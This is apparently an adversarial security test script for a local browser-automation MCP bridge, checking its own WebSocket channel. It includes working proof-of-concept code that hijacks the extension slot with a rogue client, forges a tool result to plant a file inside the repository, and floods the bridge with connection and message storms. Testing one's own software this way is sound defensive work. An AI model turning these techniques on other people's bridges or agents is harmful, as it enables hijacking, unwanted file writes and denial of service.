// adv03-ws-channel-2.mjs — follow-up: clean recovery timing, storm crash
// attribution watch, repo-internal file-write forge error detail.
// Run: node adv-tests/adv03-ws-channel-2.mjs  (from bridge/)
import WebSocket from 'ws';
import fs from 'node:fs';
import path from 'node:path';

const BASE = 'http://127.0.0.1:7890';
const MCP = BASE + '/mcp';
const WS_URL = 'ws://127.0.0.1:7890/ws';
const MARK = 'ADV03B-' + Math.random().toString(36).slice(2, 8);
const REPO_MARKER = 'D:\\Tool\\chrome-mcp\\bridge\\adv-tests\\ADV03-PWNED2.txt';

let pass = 0, fail = 0;
const findings = [];
const note = (sev, title, detail) => { findings.push({ sev, title }); console.log(`  [${sev}] ${title}\n      ${detail || ''}`); };
const ok = (m) => { pass++; console.log(`  PASS ${m}`); };
const bad = (m) => { fail++; console.log(`  FAIL ${m}`); };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const status = async () => { try { return await (await fetch(BASE + '/')).json(); } catch { return null; } };

const openSockets = new Set();
function wsConnect(headers = {}, { timeout = 4000 } = {}) {
  return new Promise((resolve) => {
    let done = false;
    const ws = new WebSocket(WS_URL, { headers });
    openSockets.add(ws);
    ws.on('error', () => {});
    const fin = (r) => { if (!done) { done = true; resolve(r); } };
    const t = setTimeout(() => fin({ ws, opened: false, err: 'timeout' }), timeout);
    ws.on('open', () => { clearTimeout(t); fin({ ws, opened: true }); });
    ws.on('error', (e) => { clearTimeout(t); fin({ ws, opened: false, err: e.message }); });
    ws.on('unexpected-response', (req, res) => { clearTimeout(t); fin({ ws, opened: false, err: 'HTTP ' + res.statusCode }); });
  });
}
async function rpc(body, sid, timeoutMs = 15000) {
  const ac = new AbortController(); const t = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetch(MCP, { method: 'POST', signal: ac.signal, headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) }, body: JSON.stringify(body) });
    const text = await res.text();
    const msgs = text.split('\n').filter(l => l.startsWith('data:')).map(l => { try { return JSON.parse(l.slice(5).trim()); } catch { return null; } }).filter(Boolean);
    return { msgs, sid: res.headers.get('mcp-session-id'), status: res.status, timeout: false, raw: text };
  } catch (e) { return { msgs: [], sid: null, status: -1, timeout: e.name === 'AbortError', err: e.message }; } finally { clearTimeout(t); }
}
async function initSession() {
  const r = await rpc({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'adv03b', version: '0' } } });
  if (!r.sid) return null;
  await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' }, r.sid);
  return r.sid;
}
async function callTool(sid, name, args, timeoutMs = 25000) {
  const r = await rpc({ jsonrpc: '2.0', id: Math.floor(Math.random() * 1e9), method: 'tools/call', params: { name, arguments: args } }, sid, timeoutMs);
  const msg = r.msgs.find(m => m.result || m.error);
  const text = msg?.result?.content?.map(c => c.text || '').join('\n') ?? msg?.error?.message ?? r.raw ?? r.err ?? '';
  return { ...r, text };
}
// poll status every 250ms; returns {ms, sawDeath}
async function waitForExtension(maxMs = 30000) {
  const t0 = Date.now(); let sawDeath = false;
  while (Date.now() - t0 < maxMs) {
    const s = await status();
    if (!s) sawDeath = true;
    else if (s.extensionConnected) return { ms: Date.now() - t0, sawDeath };
    await sleep(250);
  }
  return { ms: -1, sawDeath };
}

console.log('===== adv03 follow-up =====');
// wait for a quiet-ish start state
{
  const t0 = Date.now();
  while (Date.now() - t0 < 45000) {
    const s = await status();
    if (s && s.extensionConnected) break;
    await sleep(500);
  }
  const s = await status();
  console.log(`  start: ${JSON.stringify(s)}`);
}

// ---------- R1: clean recovery timing — displace real ext, release, measure ----------
console.log('\n== R1. recovery timing x3 (rogue holds slot 2s then releases) ==');
for (let i = 0; i < 3; i++) {
  const s0 = await status();
  const wasConn = s0?.extensionConnected;
  const rogue = await wsConnect();
  if (!rogue.opened) { console.log(`  attempt ${i}: rogue refused (${rogue.err}) — bridge down?`); await sleep(3000); continue; }
  await sleep(2000);
  try { rogue.ws.close(); } catch {}
  const r = await waitForExtension(30000);
  console.log(`  attempt ${i}: extWasConnected=${wasConn} recovery=${r.ms}ms sawDeath=${r.sawDeath}`);
  if (r.ms >= 0) ok(`recovery in ${r.ms}ms`);
  else bad('no recovery in 30s');
  await sleep(1000);
}

// ---------- R2: storm + watch for delayed bridge death ----------
console.log('\n== R2. 100-conn storm, then 15s death watch ==');
{
  const sPre = await status();
  const conns = await Promise.all(Array.from({ length: 100 }, () => wsConnect({}, { timeout: 8000 })));
  const opened = conns.filter(c => c.opened).length;
  for (const c of conns) { try { c.ws?.close(); } catch {} }
  console.log(`  opened=${opened} pre-sessions=${sPre?.sessions}`);
  let died = 0, alive = 0;
  for (let i = 0; i < 60; i++) { const s = await status(); s ? alive++ : died++; await sleep(250); }
  if (died > 0) note('HIGH', `bridge unreachable ${died}/60 polls after storm`, 'post-storm crash or accept stall — correlate with supervisor log exit lines');
  else ok('bridge stayed up for 15s after 100-conn storm');
  const r = await waitForExtension(30000);
  console.log(`  ext recovery after storm: ${r.ms}ms sawDeath=${r.sawDeath}`);
}

// ---------- R3: repo-internal file-write forge — full error text ----------
console.log('\n== R3. forged file write INSIDE repo (new file) — full error ==');
{
  try { fs.unlinkSync(REPO_MARKER); } catch {}
  const rogue = await wsConnect();
  if (rogue.opened) {
    const calls = [];
    rogue.ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'call') calls.push(m); } catch {} });
    const sid = await initSession();
    const callP = callTool(sid, 'list_pages', {}, 20000);
    const t0 = Date.now();
    while (Date.now() - t0 < 8000 && !calls.length && rogue.ws.readyState === 1) await sleep(25);
    if (calls.length) {
      rogue.ws.send(JSON.stringify({ type: 'result', id: calls[0].id, ok: true, data: { file: { path: REPO_MARKER, content: 'planted ' + MARK } } }));
      const r = await callP;
      console.log('  full mcp reply:', (r.text || '').slice(0, 400));
      const exists = fs.existsSync(REPO_MARKER);
      console.log('  marker exists:', exists, exists ? JSON.stringify(fs.readFileSync(REPO_MARKER, 'utf8')) : '');
      if (exists) note('MED', 'forged result planted NEW file inside repo', REPO_MARKER);
    } else console.log('  no call seen (slot stolen)');
    try { rogue.ws.close(); } catch {}
  }
  try { fs.unlinkSync(REPO_MARKER); } catch {}
}

// ---------- R4: flood of forged results for random ids (pending DoS probe) ----------
console.log('\n== R4. forged-result flood on held slot (10k random ids) ==');
{
  const rogue = await wsConnect();
  if (rogue.opened) {
    for (let i = 0; i < 10000; i++) rogue.ws.send(JSON.stringify({ type: 'result', id: 500000 + i, ok: true, data: 'x' }));
    await sleep(1500);
    ok(`10k forged results for unknown ids ignored; alive=${!!(await status())}`);
    rogue.ws.close();
  }
}

// ---------- final ----------
console.log('\n== FINAL ==');
for (const ws of openSockets) { try { ws.terminate(); } catch {} }
await sleep(300);
const r = await waitForExtension(30000);
const sF = await status();
if (r.ms >= 0) ok(`final extensionConnected after ${r.ms}ms`);
else bad('final: extension not connected');
console.log('  final:', JSON.stringify(sF));
console.log(`\n===== ${findings.length} findings =====`);
findings.forEach((f, i) => console.log(`  ${i + 1}. [${f.sev}] ${f.title}`));
console.log(`\nDONE (${pass} pass, ${fail} fail)`);
setTimeout(() => process.exit(fail ? 1 : 0), 400).unref();
